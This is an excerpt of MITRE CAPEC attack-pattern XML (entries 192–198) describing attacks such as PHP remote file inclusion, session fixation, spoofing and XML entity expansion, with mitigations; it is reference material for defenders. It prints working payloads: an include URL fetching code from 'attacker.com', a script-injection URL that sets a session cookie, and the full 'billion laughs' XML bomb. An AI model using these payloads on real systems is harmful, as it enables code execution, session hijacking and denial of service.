      <Attack_Pattern ID="192" Name="Protocol Analysis" Abstraction="Meta" Status="Stable">
         <Description>An adversary engages in activities to decipher and/or decode protocol information for a network or application communication protocol used for transmitting information between interconnected nodes or systems on a packet-switched data network. While this type of analysis involves the analysis of a networking protocol inherently, it does not require the presence of an actual or physical network. Although certain techniques for protocol analysis benefit from manipulating live 'on-the-wire' interactions between communicating components, static or dynamic analysis techniques applied to executables as well as to device drivers, such as network interface drivers, can also be used to reveal the function and characteristics of a communication protocol implementation. Depending upon the methods used the process may involve observing, interacting, and modifying actual communications occurring between hosts. The goal of protocol analysis is to derive the data transmission syntax, as well as to extract the meaningful content, including packet or content delimiters used by the protocol. This type of analysis is often performed on closed-specification protocols, or proprietary protocols, but is also useful for analyzing publicly available specifications to determine how particular implementations deviate from published specifications.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Prerequisites>
            <Prerequisite>Access to a binary executable.</Prerequisite>
            <Prerequisite>The ability to observe and interact with a communication channel between communicating processes.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Knowlegde of the Open Systems Interconnection model (OSI model), and famililarity with Wireshark or some other packet analyzer.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Depending on the type of analysis, a variety of tools might be required, such as static code and/or dynamic analysis tools. Alternatively, the effort might require debugging programs such as ollydbg, SoftICE, or disassemblers like IDA Pro. In some instances, packet sniffing or packet analyzing programs such as TCP dump or Wireshark are necessary. Lastly, specific protocol analysis might require tools such as PDB (Protocol Debug), or packet injection tools like pcap or Nemesis.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>Successful deciphering of protocol information compromises the confidentiality of future sensitive communications.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Note>Modifying communications after successful deciphering of protocol information compromises integrity.</Note>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="326"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-57" Section="Proprietary protocol"/>
            <Reference External_Reference_ID="REF-50" Section="Reverse engineering"/>
         </References>
         <Notes>
            <Note Type="Other">
               <xhtml:p>There are several challenges inherent to protocol analysis depending upon the nature of the protocol being analyzed. There may also be other types of factors which complicate the process such as encryption or ad hoc obfuscation of the protocol. In general there are two kinds of networking protocols, each associated with its own challenges and analysis approaches or methodologies. Some protocols are human-readable, which is to say they are text-based protocols. Examples of these types of protocols include HTTP, SMTP, and SOAP. Additionally, application-layer protocols can be embedded or encapsulated within human-readable protocols in the data portion of the packet. Typically, human-readable protocol implementations are susceptible to automatic decoding by the appropriate tools, such as Wireshark/ethereal, tcpdump, or similar protocol sniffers or analyzers.</xhtml:p>
               <xhtml:p>The presence of well-known protocol specifications in addition to easily identified protocol delimiters, such as Carriage Return or Line Feed characters (CRLF) result in text-based protocols susceptibility to direct scrutiny through manual processes. Protocol analysis against protocol implementations such as HTTP is often performed to identify idiosyncratic implementations of a protocol by a server or client. In the case of application-layer protocols which are embedded within text-based protocols, analysis techniques typically benefit from the well-known nature of the encapsulating protocols and can focus on discovering the semantic characteristics of the proprietary protocol or API, since the syntax and protocol delimiters of the underlying protocols can be readily identified.</xhtml:p>
               <xhtml:p>When performing protocol analysis of machine-readable (non-text-based) protocols difficulties emerge as the protocol itself was designed to be read by computing process. Such protocols are typically composed entirely in binary with no apparent syntax, grammar, or structural boundaries. Examples of these types of protocols are IP, UDP, and TCP. Binary protocols with published specifications can be automatically decoded by protocol analyzers, but in the case of proprietary, closed-specification, binary protocols there are no immediate indicators of packet syntax such as packet boundaries, delimiters, or structure, or the presence or absence of encryption or obfuscation. In these cases there is no one technology that can extract or reveal the structure of the packet on the wire, so it is necessary to use trial and error approaches while observing application behavior based on systematic mutations introduced at the packet-level. Tools such as Protocol Debug (PDB) or other packet injection suites are often employed. In cases where the binary executable is available, protocol analysis can be augmented with static and dynamic analysis techniques.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Other_Notes, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Protocol Reverse Engineering</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="193" Name="PHP Remote File Inclusion" Abstraction="Detailed" Status="Draft">
         <Description>In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized "include" or "require" call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="253"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. He records all the links he finds.</Description>
               <Technique>Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt variations on input parameters] The attack variants make use of a remotely available PHP script that generates a uniquely identifiable output when executed on the target application server. Possibly using an automated tool, an adversary requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads which include a reference to the remote PHP script. He records all the responses from the server that include the output of the execution of remote PHP script.</Description>
               <Technique>Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of PHP remote file inclusion payloads which include a reference to the adversary controlled remote PHP script.</Technique>
               <Technique>Use a proxy tool to record results of manual input of remote file inclusion probes in known URLs.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Run arbitrary server-side code] As the adversary succeeds in exploiting the vulnerability, they are able to execute server-side code within the application. The malicious code has virtual access to the same resources as the targeted application. Note that the adversary might include shell code in their script and execute commands on the server under the same privileges as the PHP runtime is running with.</Description>
               <Technique>Develop malicious PHP script that is injected through vectors identified during the Experiment Phase and executed by the application server to execute a custom PHP script.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Target application server must allow remote files to be included in the "require", "include", etc. PHP directives</Prerequisite>
            <Prerequisite>The adversary must have the ability to make HTTP requests to the target web application.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To inject the malicious payload in a web page</Skill>
            <Skill Level="Medium">To bypass filters in the application</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: Perform input validation for all remote content, including remote and user-generated content</Mitigation>
            <Mitigation>Implementation: Only allow known files to be included (whitelist)</Mitigation>
            <Mitigation>Implementation: Make use of indirect references passed in URL parameters instead of file names</Mitigation>
            <Mitigation>Configuration: Ensure that remote scripts cannot be include in the "include" or "require" PHP directives</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:ul>
                     <xhtml:li>The adversary controls a PHP script on a server "http://attacker.com/rfi.txt"</xhtml:li>
                     <xhtml:li>The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt')</xhtml:li>
                     <xhtml:li>The adversary creates an HTTP request that passes his own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the ".txt" prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script.</xhtml:li>
                  </xhtml:ul>
               </xhtml:div>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="98"/>
            <Related_Weakness CWE_ID="80"/>
            <Related_Weakness CWE_ID="714"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-59" Section="WASC-05 - Remote File Inclusion"/>
            <Reference External_Reference_ID="REF-60"/>
            <Reference External_Reference_ID="REF-45" Section="Top 10 2007 - Malicious File Execution"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="194" Name="Fake the Source of Data" Abstraction="Standard" Status="Stable">
         <Description>An adversary takes advantage of improper authentication to provide data or services under a falsified identity. The purpose of using the falsified identity may be to prevent traceability of the provided data or to assume the rights granted to another individual. One of the simplest forms of this attack would be the creation of an email message with a modified "From" field in order to appear that the message was sent from someone other than the actual sender. The root of the attack (in this case the email system) fails to properly authenticate the source and this results in the reader incorrectly performing the instructed action. Results of the attack vary depending on the details of the attack, but common results include privilege escalation, obfuscation of other attacks, and data corruption/manipulation.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="151">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This attack is only applicable when a vulnerable entity associates data or services with an identity. Without such an association, there would be no reason to fake the source.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Resources required vary depending on the nature of the attack. Possible tools needed by an attacker could include tools to create custom network packets, specific client software, and tools to capture network traffic. Many variants of this attack require no attacker resources, however.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Alter Execution Logic</Impact>
               <Note>By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Gain Privileges</Impact>
               <Note>By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Faking the source of data or services can be used to create a false trail in logs as the target will associate any actions with the impersonated identity instead of the adversary.</Note>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="287"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="195" Name="Principal Spoof" Abstraction="Standard" Status="Draft">
         <Description>A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity. The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="151">
               <Exclude_Related Exclude_ID="403"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target must associate data or activities with a person's identity and the adversary must be able to modify this identity without detection.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="196" Name="Session Credential Falsification through Forging" Abstraction="Standard" Status="Draft">
         <Description>An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="384"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="61"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="21"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Analyze and Understand Session IDs] The attacker finds that the targeted application use session credentials to identify legitimate users.</Description>
               <Technique>An attacker makes many anonymous connections and records the session IDs.</Technique>
               <Technique>An attacker makes authorized connections and records the session tokens or credentials.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Create Session IDs.] Attackers craft messages containing their forged credentials in GET, POST request, HTTP headers or cookies.</Description>
               <Technique>The attacker manipulates the HTTP request message and adds his forged session IDs in to the requests or cookies.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Abuse the Victim's Session Credentials] The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the forged session identifier.</Description>
               <Technique>The attacker loads the predefined or predicted session ID into his browser and browses to protected data or functionality.</Technique>
               <Technique>The attacker loads the predefined or predicted session ID into his software and utilizes functionality with the rights of the victim.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Forge the session credential and reply the request.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Attackers may require tools to craft messages containing their forged credentials, and ability to send HTTP request to a web application.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.</Mitigation>
            <Mitigation>Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>This example uses client side scripting to set session ID in the victim's browser. The JavaScript code</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">document.cookie="sessionid=0123456789"</xhtml:div>
               <xhtml:p>fixates a falsified session credential into victim's browser, with the help of crafted a URL link.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://www.example.com/&lt;script&gt;document.cookie="sessionid=0123456789";&lt;/script&gt;</xhtml:div>
               <xhtml:p>A similar example uses session ID as an argument of the URL.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://www.example.com/index.php/sessionid=0123456789</xhtml:div>
               <xhtml:p>Once the victim clicks the links, the attacker may be able to bypass authentication or piggy-back off some other authenticated victim's session.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="384"/>
            <Related_Weakness CWE_ID="664"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-62"/>
            <Reference External_Reference_ID="REF-63" Section="Testing for Session Management"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences, Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="197" Name="XML Entity Expansion" Abstraction="Detailed" Status="Draft">
         <Description>An attacker submits an XML document to a target application where the XML document uses nested entity expansion to produce an excessively large output XML. XML allows the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="230"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="228"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.</Description>
               <Technique>Use an automated tool to record all instances of URLs to process XML requests.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how the application processes XML requests.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Launch an XML Entity Expansion attack] The attacker crafts malicious XML message to force recursive entity expansion (or other repeated processing) that completely uses up available server resource.</Description>
               <Technique>Send the malicious crafted XML message containing recursive entity uses to the target URL.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>This type of attack requires that the target must receive XML input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To send recursive entity expansion XML messages.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.</Mitigation>
            <Mitigation>Implementation: Disable altogether the use of inline DTD schemas in your XML parsing objects. If must use DTD, normalize, filter and white list and parse with methods and routines that will detect entity expansion from untrusted sources.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The most common example of this type of attack is the "many laughs" attack (sometimes called the 'billion laughs' attack). For example:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;?xml version="1.0"?&gt;<xhtml:br/>&lt;!DOCTYPE lolz [<xhtml:div style="margin-left:10px;">&lt;!ENTITY lol "lol"&gt;<xhtml:br/>&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<xhtml:br/>&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<xhtml:br/>&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<xhtml:br/>&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<xhtml:br/>&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<xhtml:br/>&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6"&gt;<xhtml:br/>&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<xhtml:br/>&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</xhtml:div>
                  <xhtml:br/>]&gt;<xhtml:br/>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</xhtml:div>
               <xhtml:p>This is well formed and valid XML according to the DTD. Each entity increases the number entities by a factor of 10. The line of XML containing lol9; expands out exponentially to a message with 10^9 entities. A small message of a few KBs in size can easily be expanded into a few GB of memory in the parser. By including 3 more entities similar to the lol9 entity in the above code to the DTD, the program could expand out over a TB as there will now be 10^12 entities. Depending on the robustness of the target machine, this can lead to resource depletion, application crash, or even the execution of arbitrary code through a buffer overflow.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="400"/>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-64"/>
            <Reference External_Reference_ID="REF-65"/>
            <Reference External_Reference_ID="REF-66"/>
            <Reference External_Reference_ID="REF-67"/>
            <Reference External_Reference_ID="REF-67"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="198" Name="XSS Targeting Error Pages" Abstraction="Detailed" Status="Draft">
         <Description>An adversary distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page. When the third party web server receives the crafted request and notes the error it then creates an error message that echoes the malformed message, including the exploit. Doing this converts the exploit portion of the message into to valid language elements that are executed by the viewing browser. When a victim executes the query provided by the attacker the infected error message error message is returned including the exploit code which then runs in the victim's browser. XSS can result in execution of code as well as data leakage (e.g. session cookies can be sent to the attacker). This type of attack is especially dangerous since the exploit appears to come from the third party web server, who the victim may trust and hence be more vulnerable to deception.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="591"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="592"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="588"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>A third party web server which fails to adequately sanitize messages sent in error pages.</Prerequisite>
            <Prerequisite>The victim must be made to execute a query crafted by the attacker which results in the infected error report.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Design: Use libraries and templates that minimize unfiltered input.</Mitigation>
            <Mitigation>Implementation: Normalize, filter and white list any input that will be used in error messages.</Mitigation>
